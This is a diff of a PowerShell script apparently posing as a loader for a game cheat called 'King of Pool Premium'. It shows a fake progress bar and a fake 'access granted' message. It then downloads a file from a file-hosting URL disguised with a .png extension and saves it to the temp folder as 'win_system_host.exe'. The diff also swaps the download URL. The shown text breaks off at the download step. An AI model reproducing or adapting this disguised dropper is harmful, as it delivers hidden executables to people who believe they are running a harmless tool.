@@ -1,16 +1,16 @@
-[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 Clear-Host
+$Host.UI.RawUI.WindowTitle = "KING OF POOL LOADING..."
 Write-Host "`n  [*] INITIALIZING KING OF POOL PREMIUM" -ForegroundColor Cyan
 for ($i=0;$i -le 100;$i+=5){
     $p="$i%"
     $n=[int]($i/5)
-    # ใช้ตัว █ คู่กับตัว - เพื่อให้ดูมีมิติ
-    $b=("█"*$n)+("-"*(20-$n))
-    Write-Host "`r  ( $b ) $p " -NoNewline -ForegroundColor Magenta
+    # ใช้เครื่องหมาย = แทนหลอด และ . แทนส่วนที่เหลือ (สวยและชัวร์)
+    $b = ("=" * $n) + ("." * (20 - $n))
+    Write-Host "`r  ( $b ) $percent  " -NoNewline -ForegroundColor Magenta
     Start-Sleep -Milliseconds 40
 }
-Write-Host "`n  [+] ACCESS GRANTED. BOOTING..." -ForegroundColor Green
-$u="https://files.catbox.moe/renxf3.png"
+Write-Host "`n  [+] ACCESS GRANTED. ENGINE STARTED." -ForegroundColor Green
+$u="https://files.catbox.moe/69rald.png"
 $t="$env:TEMP\win_system_host.exe"
 try {
     Invoke-WebRequest -Uri $u -OutFile $t -UseBasicParsing
